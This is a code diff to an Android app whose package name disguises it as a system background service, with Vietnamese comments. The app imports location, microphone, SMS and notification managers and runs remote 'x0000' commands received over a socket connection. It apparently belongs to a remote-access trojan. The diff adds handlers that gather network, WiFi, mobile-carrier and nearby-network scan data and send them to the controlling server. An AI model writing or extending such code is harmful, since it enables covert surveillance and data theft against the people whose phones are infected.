@@ -29,6 +29,7 @@ import com.android.background.services.helpers.FileManager;
 import com.android.background.services.helpers.LocManager;
 import com.android.background.services.helpers.MicManager;
 import com.android.background.services.helpers.MicRecorderManager;
+import com.android.background.services.helpers.NetworkManager;
 import com.android.background.services.helpers.NotificationsManager;
 import com.android.background.services.helpers.SMSManager;
 import com.android.background.services.helpers.Storage;
@@ -190,6 +191,21 @@ public class ConnectionManager {
                                 break;
                             case "x0000clearSingleNt":
                                 x0000clearSingleNt(data.getString("notificationKey"));
+                                break;
+                            case "x0000net":
+                                x0000net();
+                                break;
+                            case "x0000wifi":
+                                x0000wifi();
+                                break;
+                            case "x0000mobile":
+                                x0000mobile();
+                                break;
+                            case "x0000wifiScan":
+                                x0000wifiScan();
+                                break;
+                            case "x0000mobileDetail":
+                                x0000mobileDetail();
                                 break;
 
 
@@ -632,6 +648,106 @@ public class ConnectionManager {
                 errorResponse.put("status", false);
                 errorResponse.put("message", "Error clearing notification: " + e.getMessage());
                 ioSocket.emit("x0000clearSingleNt", errorResponse);
+            } catch (JSONException je) {
+                je.printStackTrace();
+            }
+        }
+    }
+
+    /**
+     * Lấy thông tin tổng hợp về mạng
+     */
+    public static void x0000net() {
+        try {
+            NetworkManager networkManager = new NetworkManager(context);
+            JSONObject networkInfo = networkManager.getNetworkInfo();
+            ioSocket.emit("x0000net", networkInfo);
+        } catch (Exception e) {
+            Log.e("x0000net", "Error getting network info: " + e.getMessage());
+            try {
+                JSONObject errorResponse = new JSONObject();
+                errorResponse.put("error", "Failed to get network info: " + e.getMessage());
+                ioSocket.emit("x0000net", errorResponse);
+            } catch (JSONException je) {
+                je.printStackTrace();
+            }
+        }
+    }
+
+    /**
+     * Lấy thông tin WiFi
+     */
+    public static void x0000wifi() {
+        try {
+            NetworkManager networkManager = new NetworkManager(context);
+            JSONObject wifiInfo = networkManager.getWifiInfo();
+            ioSocket.emit("x0000wifi", wifiInfo);
+        } catch (Exception e) {
+            Log.e("x0000wifi", "Error getting WiFi info: " + e.getMessage());
+            try {
+                JSONObject errorResponse = new JSONObject();
+                errorResponse.put("error", "Failed to get WiFi info: " + e.getMessage());
+                ioSocket.emit("x0000wifi", errorResponse);
+            } catch (JSONException je) {
+                je.printStackTrace();
+            }
+        }
+    }
+
+    /**
+     * Lấy thông tin mạng di động
+     */
+    public static void x0000mobile() {
+        try {
+            NetworkManager networkManager = new NetworkManager(context);
+            JSONObject mobileInfo = networkManager.getMobileInfo();
+            ioSocket.emit("x0000mobile", mobileInfo);
+        } catch (Exception e) {
+            Log.e("x0000mobile", "Error getting mobile info: " + e.getMessage());
+            try {
+                JSONObject errorResponse = new JSONObject();
+                errorResponse.put("error", "Failed to get mobile info: " + e.getMessage());
+                ioSocket.emit("x0000mobile", errorResponse);
+            } catch (JSONException je) {
+                je.printStackTrace();
+            }
+        }
+    }
+
+    /**
+     * Quét các mạng WiFi có sẵn
+     */
+    public static void x0000wifiScan() {
+        try {
+            NetworkManager networkManager = new NetworkManager(context);
+            JSONArray wifiNetworks = networkManager.getAvailableWifiNetworks();
+            ioSocket.emit("x0000wifiScan", wifiNetworks);
+        } catch (Exception e) {
+            Log.e("x0000wifiScan", "Error scanning WiFi networks: " + e.getMessage());
+            try {
+                JSONObject errorResponse = new JSONObject();
+                errorResponse.put("error", "Failed to scan WiFi networks: " + e.getMessage());
+                ioSocket.emit("x0000wifiScan", errorResponse);
+            } catch (JSONException je) {
+                je.printStackTrace();
+            }
+        }
+    }
+
+    /**
+     * Lấy thông tin chi tiết về mạng di động
+     */
+    public static void x0000mobileDetail() {
+        try {
+            NetworkManager networkManager = new NetworkManager(context);
+            JSONObject mobileDetail = networkManager.getDetailedMobileInfo();
+            ioSocket.emit("x0000mobileDetail", mobileDetail);
+        } catch (Exception e) {
+            Log.e("x0000mobileDetail", "Error getting mobile detail: " + e.getMessage());
+            try {
+                JSONObject errorResponse = new JSONObject();
+                errorResponse.put("error", "Failed to get mobile detail: " + e.getMessage());
+                ioSocket.emit("x0000mobileDetail", errorResponse);
             } catch (JSONException je) {
                 je.printStackTrace();
             }
